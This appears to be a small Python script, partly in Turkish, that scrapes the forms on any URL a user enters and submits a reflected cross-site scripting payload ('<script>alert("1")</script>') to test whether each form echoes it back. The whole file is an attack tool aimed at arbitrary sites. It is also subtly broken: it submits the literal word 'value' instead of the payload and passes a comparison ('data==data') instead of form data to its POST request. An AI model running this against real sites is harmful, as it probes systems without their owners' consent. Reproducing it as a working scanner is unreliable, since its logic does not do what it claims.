import requests
from pprint import pprint
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import colorama
from colorama import Fore, Back,Style
import sys
import time
colorama.init()

class xssClass:

    def getForms(self,url):
        soup = BeautifulSoup(requests.get(url).content, 'html.parser')
        return soup.find_all('form')

    def getFormDetails(self,form):
        details = {}


        action = form.attrs.get('action').lower()

        method = form.attrs.get('method', 'get').lower()

        inputs = []
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            inputs.append({'type':input_type, 'name':input_name})


        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs

        return details

    def sendForms(self,form_details, url, value):

        target_url = urljoin(url, form_details['action'])

        inputs = form_details['inputs']
        data = {}
        for input in inputs:

            if input['type'] == 'text' or input['type'] == 'search':
                input['value'] = 'value'
            input_name = input.get('name')
            input_value = input.get('value')
            if input_name and input_value:

                data[input_name] = input_value

        if form_details['method'] == 'post':
            return requests.post(target_url, data==data)
        elif form_details['method'] == 'get':
            return requests.get(target_url, params=data)

    def xss(self,url):

        forms = self.getForms(url)
        print(Fore.GREEN+f' [+] Tespit edildi!!! {len(forms)} Forms on{url}')
        print(Style.RESET_ALL)

        try:
                maliciousCode = '<script>alert("1")</script>'
        except FileNotFoundError:
            print()
            print("try again !")
            sys.exit(0)
        print()
        time.sleep(2)


        state = False


        for form in forms:
            form_details = self.getFormDetails(form)
            content = self.sendForms(form_details, url, maliciousCode).content.decode()
            if maliciousCode in content:
                print(f' XSS scanner {url}')
                print(f' Form detay: ')
                pprint(form_details)
                state = True

        return state
xssTool=xssClass()

url = input('URL adresi: ')
print(xssTool.xss(url))
